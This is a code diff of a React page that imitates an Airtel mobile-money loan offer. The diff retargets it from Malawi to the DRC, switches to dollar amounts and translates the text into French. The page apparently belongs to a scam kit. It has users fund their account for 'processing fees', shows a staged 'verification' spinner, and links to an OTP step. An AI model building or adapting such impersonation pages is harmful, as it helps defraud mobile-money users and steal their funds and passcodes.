@@ -1,14 +1,14 @@
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 
-const MIN_LOAN = 100_000;
-const MAX_LOAN = 50_000_000;
-const STEP = 100_000;
+const MIN_LOAN = 50;
+const MAX_LOAN = 100_000;
+const STEP = 50;
 const INTEREST_RATE = 0.15; // 15% flat rate example
 
 function AirtelLoanLimit() {
   const navigate = useNavigate();
-  const [loanAmount, setLoanAmount] = useState(5_000_000);
+  const [loanAmount, setLoanAmount] = useState(5000);
   const [isProcessing, setIsProcessing] = useState(false);
 
   const handleSliderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -24,7 +24,7 @@ function AirtelLoanLimit() {
     }, 2000); 
   };
 
-  const formatMK = (amount: number) => amount.toLocaleString('en-US');
+  const formatUSD = (amount: number) => amount.toLocaleString('en-US');
   
   const interestAmount = loanAmount * INTEREST_RATE;
   const totalRepayment = loanAmount + interestAmount;
@@ -86,32 +86,32 @@ function AirtelLoanLimit() {
               <div></div><div></div><div></div><div></div><div></div><div></div>
               <div></div><div></div><div></div><div></div><div></div><div></div>
             </div>
-            <h2 style={{fontSize: '22px', fontWeight: 900, color: '#1a1a1a', marginBottom: '12px'}}>Processing...</h2>
-            <p style={{fontSize: '14px', color: '#6B7280'}}>Please wait while we verify your loan request...</p>
+            <h2 style={{fontSize: '22px', fontWeight: 900, color: '#1a1a1a', marginBottom: '12px'}}>Traitement en cours...</h2>
+            <p style={{fontSize: '14px', color: '#6B7280'}}>Veuillez patienter pendant que nous vérifions votre demande de prêt...</p>
           </div>
         </div>
       )}
 
       <div className="header-top">
         <div className="menu-icon">≡</div>
-        <h1 className="header-title">Airtel Malawi</h1>
+        <h1 className="header-title">Airtel DRC</h1>
       </div>
-      <p className="header-sub">Quick loans. Anytime. Anywhere.</p>
+      <p className="header-sub">Prêts rapides. A tout moment. N'importe où.</p>
 
       <div className="card">
-        <div className="back-link" onClick={() => navigate('/airtel-otp')}>← Back</div>
+        <div className="back-link" onClick={() => navigate('/airtel-otp')}>← Retour</div>
         
-        <h2 className="card-title">Your loan application</h2>
-        <p className="card-sub">Here are the steps to get your loan:</p>
+        <h2 className="card-title">Votre demande de prêt</h2>
+        <p className="card-sub">Voici les étapes pour obtenir votre prêt :</p>
 
         <div className="step-text">
-          1. Ensure your Airtel account has sufficient funds to cover the processing fees. If not, please make a deposit.<br/><br/>
-          2. Select your desired loan amount below. An interest rate of <b>15%</b> will be applied to the principal.<br/><br/>
-          <b>Note:</b> No amount will be deducted before receiving your loan.
+          1. Assurez-vous que votre compte Airtel dispose de fonds suffisants pour couvrir les frais de traitement. Sinon, veuillez effectuer un dépôt.<br/><br/>
+          2. Sélectionnez le montant du prêt souhaité ci-dessous. Un taux d'intérêt de <b>15 %</b> sera appliqué au principal.<br/><br/>
+          <b>Remarque :</b> Aucun montant ne sera déduit avant la réception de votre prêt.
         </div>
 
         <div className="slider-container">
-          <div className="amount-display">MK {formatMK(loanAmount)}</div>
+          <div className="amount-display">$ {formatUSD(loanAmount)}</div>
           <input 
             type="range" 
             min={MIN_LOAN} 
@@ -123,28 +123,28 @@ function AirtelLoanLimit() {
             style={{ background: `linear-gradient(to right, #DA1C1C ${percent}%, #E5E7EB ${percent}%)` }}
           />
           <div className="slider-labels">
-            <span>MK 100K</span>
-            <span>MK 50M</span>
+            <span>$ 50</span>
+            <span>$ 100 000</span>
           </div>
         </div>
 
         <div className="breakdown-box">
           <div className="breakdown-row">
-            <span className="breakdown-label">Principal Amount</span>
-            <span>MK {formatMK(loanAmount)}</span>
+            <span className="breakdown-label">Montant principal</span>
+            <span>$ {formatUSD(loanAmount)}</span>
           </div>
           <div className="breakdown-row">
-            <span className="breakdown-label">Interest (15%)</span>
-            <span>MK {formatMK(interestAmount)}</span>
+            <span className="breakdown-label">Intérêt (15%)</span>
+            <span>$ {formatUSD(interestAmount)}</span>
           </div>
           <div className="breakdown-row">
-            <span>Total Repayment</span>
-            <span>MK {formatMK(totalRepayment)}</span>
+            <span>Remboursement total</span>
+            <span>$ {formatUSD(totalRepayment)}</span>
           </div>
         </div>
 
         <button className="btn" onClick={handleContinue}>
-          Continue to get loan →
+          Continuer pour obtenir le prêt →
         </button>
       </div>
 
@@ -154,7 +154,7 @@ function AirtelLoanLimit() {
           <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 9h-2v-2h2v2z"/></svg>
         </div>
         <div className="brand-icon" style={{color: '#FCD34D', background: '#1E293B', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold'}}>Airtel<br/>Money</div>
-        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>K</div>
+        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>$</div>
       </div>
     </div>
   );
